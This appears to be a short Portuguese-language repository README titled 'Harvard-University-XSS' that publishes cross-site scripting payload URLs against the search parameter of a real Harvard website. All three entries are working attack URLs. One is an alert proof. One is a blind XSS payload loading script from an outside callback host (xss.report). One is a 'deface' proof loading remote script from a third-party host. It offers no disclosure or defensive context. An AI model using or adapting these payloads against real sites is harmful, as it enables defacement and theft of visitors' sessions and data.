# Harvard-University-XSS
## XSS Encontrados Na Universidade De Harvard

![JavaScript](https://img.shields.io/badge/JavaScript-F7DF1E?style=for-the-badge&logo=javascript&logoColor=black)
## Bug : XSS


## alert Bug 🤷‍♀️
```
https://bhi.fas.harvard.edu/?s=e%27%22()%26%25%3Czzz%3E%3CScRiPt%20%3Ealert(9155)%3C/ScRiPt%3E
```

## blind XSS 🤷‍♀️ 
```
https://bhi.fas.harvard.edu/?s=e%27%22()%26%25%3Czzz%3E%27%22%3E%3Cscript%20src=https://xss.report/c/{username}%3E%3C/script%3E
```

## deface POC : 
```
https://bhi.fas.harvard.edu/?s=e%27%22()%26%25%3Czzz%3E%27%22%3E%3Cscript%20src=https://jso-tools.z-x.my.id/raw/~/2FD8N5LJDAGNG%3E%3C/script%3E
```
